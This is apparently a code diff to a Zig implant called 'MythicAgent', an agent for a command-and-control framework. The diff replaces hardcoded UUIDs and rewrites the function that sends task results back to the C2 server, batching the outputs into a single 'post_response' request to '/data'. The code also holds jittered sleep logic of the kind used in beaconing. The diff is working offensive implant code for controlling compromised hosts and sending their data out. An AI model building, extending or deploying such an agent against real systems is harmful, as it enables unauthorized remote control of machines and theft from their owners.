@@ -49,10 +49,10 @@ pub const MythicAgent = struct {
         var crypto_utils = CryptoUtils.init(allocator);
         
         // Generate UUIDs and keys
-        const uuid = "b1d4ed2c-6d68-43c2-8963-435ef3cc52f9";
+        const uuid = "8c98266e-7353-4c76-91a2-9bfbbc3f3bc6";
         const session_id = try crypto_utils.generateSessionId();
         const aes_key = CryptoUtils.generateAESKey();
-        const payload_uuid = "b1d4ed2c-6d68-43c2-8963-435ef3cc52f9";
+        const payload_uuid = "8c98266e-7353-4c76-91a2-9bfbbc3f3bc6";
         
         return Self{
             .allocator = allocator,
@@ -346,30 +346,47 @@ pub const MythicAgent = struct {
     
     // Send responses back to C2
     fn sendResponses(self: *Self) !void {
+        if (self.pending_responses.items.len == 0) return;
+        
+        // Define the response struct type explicitly
+        const ResponseObj = struct {
+            task_id: []const u8,
+            user_output: ?[]const u8 = null,
+            completed: bool = true,
+            status: []const u8,
+        };
+        
+        // Create an array of response objects
+        var responses = std.ArrayList(ResponseObj).init(self.allocator);
+        defer responses.deinit();
+        
         for (self.pending_responses.items) |response| {
-            const response_data = .{
-                .action = "post_response",
-                .uuid = self.uuid,
+            const response_obj = ResponseObj{
                 .task_id = response.task_id,
-                .response = response.user_output,
+                .user_output = response.user_output,
                 .completed = response.completed,
                 .status = response.status,
-                .artifacts = response.artifacts,
             };
-            
-            const json_data = try json.stringifyAlloc(self.allocator, response_data, .{});
-            defer self.allocator.free(json_data);
-            
-            const server_response = try self.network_client.sendRequest("/data", json_data);
-            defer self.allocator.free(server_response);
-            
-            print("[+] Sent response for task: {s}\n", .{response.task_id});
+            try responses.append(response_obj);
         }
+        
+        const response_data = .{
+            .action = "post_response",
+            .responses = responses.items,
+        };
+        
+        const json_data = try json.stringifyAlloc(self.allocator, response_data, .{});
+        defer self.allocator.free(json_data);
+        print("[DEBUG] Sending batch response JSON: {s}\n", .{json_data}); 
+
+        const server_response = try self.network_client.sendRequest("/data", json_data);
+        defer self.allocator.free(server_response);
+        
+        print("[+] Sent {} responses in batch\n", .{self.pending_responses.items.len});
         
         // Clear pending responses
         self.pending_responses.clearAndFree();
     }
-    
     // Sleep with jitter
     fn sleep(self: *Self) void {
         const sleep_time = TimeUtils.calculateJitteredSleep(self.config.sleep_interval, self.config.jitter);
